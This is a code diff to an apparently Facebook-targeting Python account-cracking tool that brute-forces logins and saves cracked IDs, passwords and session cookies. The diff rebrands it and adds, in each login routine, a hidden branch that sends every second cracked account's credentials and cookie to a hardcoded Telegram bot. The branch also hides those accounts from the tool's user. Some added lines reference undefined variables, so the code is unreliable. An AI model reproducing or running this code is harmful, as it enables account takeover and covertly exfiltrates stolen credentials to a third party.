@@ -1751,6 +1751,7 @@ def mbasic(uid,pwx,tl):
     global cps
     global twf
     global loop
+    global bkas
     sys.stdout.write(f"\r {green}(M1--SUMON) ({loop}) (OK-{len(oks)})\r"),
     sys.stdout.flush()
     try:
@@ -1797,21 +1798,27 @@ def mbasic(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f" {cyan}(SUMON-2F) {cid}|{pw} ")
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        print(f" {green}(SUMON-OK) {cid}|{pw} ")
-                        print(f" {green}Cookie : {green}{coki}")
-                        open("/sdcard/SUMON-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        oks.append(cid)
-                        break
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                        else:
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[141:156]
-                print('\33[1;91m[SUMON-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/SUMON-Cp.txt', 'a').write(uid+' | '+pw+'\n')
+                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                uid = "1000"+coki1[0:11]
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
@@ -1823,12 +1830,12 @@ def mbasic(uid,pwx,tl):
         #print({error})
         pass
 
-
 def p(uid,pwx,tl):
     global oks
     global cps
     global twf
     global loop
+    global bkas
     sys.stdout.write(f"\r {green}(M2--SUMON) ({loop}) (OK-{len(oks)})\r"),
     sys.stdout.flush()
     try:
@@ -1889,21 +1896,27 @@ def p(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f" {cyan}(SUMON-2F) {cid}|{pw} ")
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        print(f" {green}(SUMON-OK) {cid}|{pw} ")
-                        print(f" {green}Cookie : {green}{coki}")
-                        open("/sdcard/SUMON-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        oks.append(cid)
-                        break
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                        else:
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[141:156]
-                print('\33[1;91m[SUMON-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/SUMON-Cp.txt', 'a').write(uid+' | '+pw+'\n')
+                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                uid = "1000"+coki1[0:11]
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
@@ -1915,11 +1928,13 @@ def p(uid,pwx,tl):
         #print({error})
         pass
 
+
 def x(uid,pwx,tl):
     global oks
     global cps
     global twf
     global loop
+    global bkas
     sys.stdout.write(f"\r {green}(M3--SUMON) ({loop}) (OK-{len(oks)})\r"),
     sys.stdout.flush()
     try:
@@ -1964,21 +1979,27 @@ def x(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f" {cyan}(SUMON-2F) {cid}|{pw} ")
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        print(f" {green}(SUMON-OK) {cid}|{pw} ")
-                        print(f" {green}Cookie : {green}{coki}")
-                        open("/sdcard/SUMON-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        oks.append(cid)
-                        break
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                        else:
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[141:156]
-                print('\33[1;91m[SUMON-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/SUMON-Cp.txt', 'a').write(uid+' | '+pw+'\n')
+                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                uid = "1000"+coki1[0:11]
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
@@ -1996,6 +2017,7 @@ def mobile(uid,pwx,tl):
     global cps
     global twf
     global loop
+    global bkas
     sys.stdout.write(f"\r {green}(M4--SUMON) ({loop}) (OK-{len(oks)})\r"),
     sys.stdout.flush()
     try:
@@ -2051,21 +2073,27 @@ def mobile(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f" {cyan}(SUMON-2F) {cid}|{pw} ")
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        print(f" {green}(SUMON-OK) {cid}|{pw} ")
-                        print(f" {green}Cookie : {green}{coki}")
-                        open("/sdcard/SUMON-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        oks.append(cid)
-                        break
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                        else:
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[141:156]
-                print('\33[1;91m[SUMON-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/SUMON-Cp.txt', 'a').write(uid+' | '+pw+'\n')
+                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                uid = "1000"+coki1[0:11]
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
@@ -2076,6 +2104,7 @@ def mobile(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
+
 
 
 def freeq(uid,pwx,tl):
@@ -2141,7 +2170,8 @@ def freeq(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f" {cyan}(SUMON-2F) {cid}|{pw} ")
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
                         bkas.append(cid)
@@ -2149,18 +2179,18 @@ def freeq(uid,pwx,tl):
                            statusok = (f"{cid}|{pw}|{coki}")
                            requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
                         else:
-                           print(f" {green}(SUMON-OK) {cid}|{pw} ")
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/SUMON-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                            oks.append(cid)
                            break
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[141:156]
-                print('\33[1;91m[SUMON-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/SUMON-Cp.txt', 'a').write(uid+' | '+pw+'\n')
+                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                uid = "1000"+coki1[0:11]
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
@@ -2172,11 +2202,13 @@ def freeq(uid,pwx,tl):
         #print({error})
         pass
 
+
 def d(uid,pwx,tl):
     global oks
     global cps
     global twf
     global loop
+    global bkas
     sys.stdout.write(f"\r {green}(M6--SUMON) ({loop}) (OK-{len(oks)})\r"),
     sys.stdout.flush()
     try:
@@ -2232,21 +2264,27 @@ def d(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f" {cyan}(SUMON-2F) {cid}|{pw} ")
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        print(f" {green}(SUMON-OK) {cid}|{pw} ")
-                        print(f" {green}Cookie : {green}{coki}")
-                        open("/sdcard/SUMON-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        oks.append(cid)
-                        break
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                        else:
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[141:156]
-                print('\33[1;91m[SUMON-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/SUMON-Cp.txt', 'a').write(uid+' | '+pw+'\n')
+                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                uid = "1000"+coki1[0:11]
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
@@ -2263,6 +2301,7 @@ def cracker(uid, pwx, tl):
     global cps
     global twf
     global loop
+    global bkas
     sys.stdout.write(f"\r {green}(SUMON) ({loop}) (OK-{len(oks)})\r"),
     sys.stdout.flush()
     try:
@@ -2517,21 +2556,27 @@ def cracker(uid, pwx, tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f" {cyan}(SUMON-2F) {cid}|{pw} ")
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        print(f" {green}(SUMON-OK) {cid}|{pw} ")
-                        print(f" {white}Cookie : {green}{coki}")
-                        open("/sdcard/SUMON-Number-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        oks.append(cid)
-                        break
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                        else:
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[141:156]
-                print('\33[1;91m[SUMON-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/SUMON-Cp.txt', 'a').write(uid+' | '+pw+'\n')
+                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                uid = "1000"+coki1[0:11]
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
             else:
@@ -2540,8 +2585,7 @@ def cracker(uid, pwx, tl):
     except ce:
         time.sleep(20)
     except Exception as error:
+        #print({error})
         pass
-
-
 
 menu()
